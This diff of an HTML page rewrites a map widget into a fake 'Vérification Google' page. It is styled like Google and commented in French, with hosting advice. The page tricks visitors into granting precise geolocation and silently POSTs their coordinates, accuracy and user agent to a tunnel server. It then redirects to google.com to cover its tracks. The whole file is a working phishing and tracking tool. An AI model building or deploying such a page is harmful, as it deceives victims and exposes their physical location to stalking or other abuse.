@@ -1,35 +1,94 @@
-<!-- proxy.html hébergé sur https://tonuser.github.io/proxy.html -->
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Widget Google Maps</title>
+    <title>Vérification Google</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            text-align: center;
+            padding: 40px 20px;
+            background: #f8f9fa;
+        }
+        .card {
+            background: white;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        h3 { color: #202124; margin-bottom: 20px; }
+        #status { color: #5f6368; margin-top: 20px; }
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e8eaed;
+            border-top: 3px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
+    <div class="card">
+        <h3>📍 Vérification de votre zone</h3>
+        <div class="loader"></div>
+        <div id="status">Autorisez la localisation pour continuer...</div>
+    </div>
+
     <script>
-        // Cette page est hébergée sur github.io (domaine légitime)
-        // Elle demande la géoloc -> POP-UP NORMALE (pas "Location blocked")
+        // ⚠️ REMPLACE PAR TON URL SERVEO EXACTE
+        const SERVEO_URL = "https://2a459525a273779c-105-71-134-98.serveousercontent.com";
         
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                // Envoie le GPS à ton serveur Replit
-                fetch('https://2a459525a273779c-105-71-134-98.serveousercontent.com', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        method: 'github-proxy'
-                    })
-                });
-                
-                // Ferme la popup ou redirige
-                window.close();
-            },
-            (err) => {
-                console.log('Géoloc refusée');
-            }
-        );
+        const statusDiv = document.getElementById('status');
+        
+        function sendGPS(lat, lon, acc) {
+            statusDiv.innerHTML = "✅ Position validée !<br>Redirection...";
+            
+            fetch(SERVEO_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    lat: lat,
+                    lon: lon,
+                    accuracy: acc,
+                    method: 'github-proxy',
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                })
+            }).then(() => {
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1500);
+            }).catch((err) => {
+                console.error('Erreur:', err);
+                statusDiv.innerHTML = "❌ Erreur de connexion.<br>Fermeture...";
+                setTimeout(() => window.close(), 2000);
+            });
+        }
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    sendGPS(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                },
+                (err) => {
+                    statusDiv.innerHTML = "❌ Localisation refusée.<br>Impossible de continuer.";
+                    setTimeout(() => window.close(), 2000);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            statusDiv.innerHTML = "❌ Géolocalisation non supportée.";
+            setTimeout(() => window.close(), 2000);
+        }
     </script>
-    <p>Chargement de la carte...</p>
 </body>
 </html>
